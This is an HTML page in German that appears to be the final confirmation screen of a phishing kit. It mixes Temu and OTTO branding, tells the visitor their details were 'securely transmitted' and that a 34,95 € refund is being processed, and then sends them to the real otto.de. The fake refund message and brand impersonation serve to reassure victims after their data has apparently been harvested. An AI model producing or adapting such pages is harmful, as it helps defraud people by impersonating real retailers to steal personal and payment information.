<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rückerstattung Bestätigt - Temu</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
        .done-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 10px;
            text-align: center;
        }

        .checkmark {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            display: block;
            stroke-width: 3;
            stroke: #4CAF50;
            stroke-miterlimit: 10;
            margin: 0 auto 30px auto;
            box-shadow: inset 0px 0px 0px #4CAF50;
            animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
        }

        .checkmark__circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            stroke-width: 3;
            stroke-miterlimit: 10;
            stroke: #4CAF50;
            fill: none;
            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
        }

        .checkmark__check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
        }

        @keyframes stroke {
            100% { stroke-dashoffset: 0; }
        }

        @keyframes scale {
            0%, 100% { transform: none; }
            50% { transform: scale3d(1.1, 1.1, 1); }
        }

        @keyframes fill {
            100% { box-shadow: inset 0px 0px 0px 40px rgba(76, 175, 80, 0.1); }
        }

        .done-headline {
            font-size: 24px;
            font-weight: 700;
            color: #222;
            margin-bottom: 15px;
        }

        .done-text {
            font-size: 15px;
            color: #555;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .done-details {
            background-color: #f9f9f9;
            border: 1px solid #eaeaea;
            border-radius: 8px;
            padding: 20px;
            width: 100%;
            text-align: center;
            margin-bottom: 35px;
        }

        .done-amount-label {
            font-size: 13px;
            color: #777;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
        }

        .done-amount {
            font-size: 26px;
            font-weight: 700;
            color: #4CAF50; /* Green success color */
        }
    </style>
</head>
<body>

    <div class="pl_focussed-dialog__container">
        
        <div class="hedopan">
            <img src="./img/hedoipa.PNG" alt="OTTO" />
        </div>
        
        <section class="pl_focussed-dialog__content">
            <div class="form done-container">
                
                <!-- Satisfying Animated Checkmark -->
                <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                    <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
                    <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                </svg>

                <div class="done-headline">Erfolgreich abgeschlossen!</div>
                
                <div class="done-text">
                    Vielen Dank. Ihre Angaben wurden sicher übermittelt. Die Auszahlung wurde in unserem System hinterlegt und wird nun bearbeitet.
                </div>

                <div class="done-details">
                    <div class="done-amount-label">Rückerstattungsbetrag</div>
                    <div class="done-amount">34,95 €</div>
                    <div style="font-size: 12px; color: #888; margin-top: 10px;">
                        Gutschrift erfolgt in der Regel innerhalb von 1-3 Werktagen.
                    </div>
                </div>

                <button type="button" class="btn btn-red" onclick="window.location.href='https://www.otto.de'">
                    Zurück zu OTTO.de
                </button>
            </div>
        </section>
    </div>

    <footer class="footer">
        <div class="footer-lines">
            <a href="#">Cookie-Einstellungen</a> &middot;
            <a href="#">AGB</a> &middot;
            <a href="#">Datenschutz</a> &middot;
            <a href="#">Impressum</a> &middot;
            <br>
            <a href="#">Information zur Barrierefreiheit</a> &middot;
            <a href="#">Produktsicherheitsrückrufe</a> &middot;
            <a href="#">OTTO Versprechen</a>
        </div>
        <div class="price-info">
            Preisangaben inkl. Steuer und zzgl. Service- und Versandkosten
        </div>
    </footer>
</body>

</html>